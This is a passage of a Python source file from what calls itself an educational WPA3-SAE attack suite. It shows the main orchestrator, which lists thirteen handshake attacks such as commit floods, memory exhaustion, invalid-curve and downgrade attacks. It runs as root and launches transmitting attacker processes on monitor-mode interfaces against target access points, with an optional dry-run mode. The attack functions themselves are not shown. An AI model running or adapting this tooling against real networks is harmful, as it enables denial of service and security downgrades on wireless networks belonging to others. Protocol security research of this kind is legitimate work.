            if p is not None and hasattr(p, 'is_alive') and p.is_alive():
                p.terminate()
                p.join(timeout=2)
                if p.is_alive(): p.kill()
        except (AttributeError, ValueError, OSError) as e:
            logger.warning(f"[CLEANUP] Error stopping {iface}: {e}")
    if scanner is not None:
        try:
            if hasattr(scanner, 'is_alive') and scanner.is_alive():
                scanner.terminate()
                scanner.join(timeout=2)
                if scanner.is_alive(): scanner.kill()
        except (AttributeError, ValueError, OSError) as e:
            logger.warning(f"[CLEANUP] Error stopping scanner: {e}")

def main():
    valid_attacks = [
        "commit_flood", "reflection_attack", "memory_exhaustion", "deadlock", 
        "zero_scalar", "invalid_curve", "downgrade", "open_auth", "unknown_pw_id",
        "simultaneous_pw_id_conflict", "group_mismatch_tiebreaker_deadlock",
        "threshold_boundary", "silent_discard"
    ]
    
    parser = argparse.ArgumentParser(
        description="WPA3-SAE Formal Attack Suite (Educational/Research Edition)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=ENCYCLOPEDIA_TEXT
    )
    parser.add_argument("--dry-run", action="store_true", help="Construct packets but DO NOT send")
    parser.add_argument("--attack", type=str, choices=valid_attacks, help="Override attack type for all given interfaces")
    parser.add_argument("--interfaces", type=str, help="Comma-separated list of interfaces (e.g. wlan10mon,wlan1mon)")
    parser.add_argument("--band", type=str, help="Comma-separated list of bands mapping to interfaces (e.g. 5GHz,2.4GHz)")
    args = parser.parse_args()
    dry_run = args.dry_run

    if os.geteuid() != 0:
        sys.exit("Root required (sudo).")

    logger.info("[MODE] DRY-RUN: Packets constructed but NOT transmitted." if dry_run else "[MODE] EXECUTE: Packets WILL be transmitted!")

    global ADAPTER_CONFIGURATION
    # === OVERRIDE LOGIC ===
    if args.interfaces or args.band:
        if not (args.interfaces and args.band):
            sys.exit("Error: To override adapters, BOTH --interfaces and --band must be provided.")
        ifaces = [i.strip() for i in args.interfaces.split(',')]
        bands = [b.strip() for b in args.band.split(',')]
        if len(ifaces) != len(bands):
            sys.exit("Error: The number of --interfaces must exactly match the number of --band arguments.")
        if not args.attack:
            sys.exit("Error: Please specify an --attack when overriding interfaces.")
        
        # Build new configuration to replace defaults
        ADAPTER_CONFIGURATION = {}
        for i in range(len(ifaces)):
            ADAPTER_CONFIGURATION[ifaces[i]] = {"band": bands[i], "attack": args.attack}
    elif args.attack:
        # User only specified an attack, override the default attack for all pre-configured interfaces
        for iface in ADAPTER_CONFIGURATION:
            ADAPTER_CONFIGURATION[iface]['attack'] = args.attack

    shared = Manager().dict({'2.4GHz': MANUAL_CHANNEL_2_4GHZ, '5GHz': MANUAL_CHANNEL_5GHZ})
    lock = Lock()
    scanner_proc = None
    if SCANNER_INTERFACE:
        scanner_proc = Process(target=scanner_process, args=(SCANNER_INTERFACE, SCANNER_INTERVAL, SCANNER_DURATION, shared, lock, TARGET_BSSID_5GHZ, TARGET_BSSID_2_4GHZ), daemon=True)
        scanner_proc.start()
        time.sleep(2)

    procs, counters = {}, {i: Value('L', 0) for i in ADAPTER_CONFIGURATION}
    try:
        while True:
            for iface, cfg in ADAPTER_CONFIGURATION.items():
                band, attack = cfg['band'], cfg['attack']
                
                with lock:
                    ch = shared.get(band)
                    if not ch:
                        ch = MANUAL_CHANNEL_5GHZ if band == '5GHz' else MANUAL_CHANNEL_2_4GHZ
                
                if not ch:
                    logger.info(f"[WAIT] {iface}: Waiting for scanner to find {band} AP channel...")
                    time.sleep(3)
                    continue
                # ===================================

                try:
                    proc_alive = procs.get(iface) is not None and procs[iface].is_alive()
                except (AttributeError, ValueError):
                    proc_alive = False

                if not proc_alive:
                    validate_sae_data(band)
                    log_attack_meta(attack, band, ch, iface, dry_run)
                    target_b = TARGET_BSSID_5GHZ if band == '5GHz' else TARGET_BSSID_2_4GHZ
                    p = Process(
                        target=run_attacker_process,
                        args=(iface, target_b, ch, band, attack, counters[iface], shared),
                        kwargs={'dry_run': dry_run},
                        daemon=True
                    )
                    procs[iface] = p
                    p.start()
                    logger.info(f"[ORCHESTRATOR] Interface: {iface} | Band: {band} | Channel: {ch} | Attack: {attack.upper()}")
                    time.sleep(LOG_DELAY_BETWEEN_ATTACKS)
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("[INFO] Ctrl+C detected. Shutting down gracefully...")
    finally:
        cleanup(procs, scanner_proc)
        logger.info("[DONE] Shutdown complete")

if __name__ == "__main__":
    main()
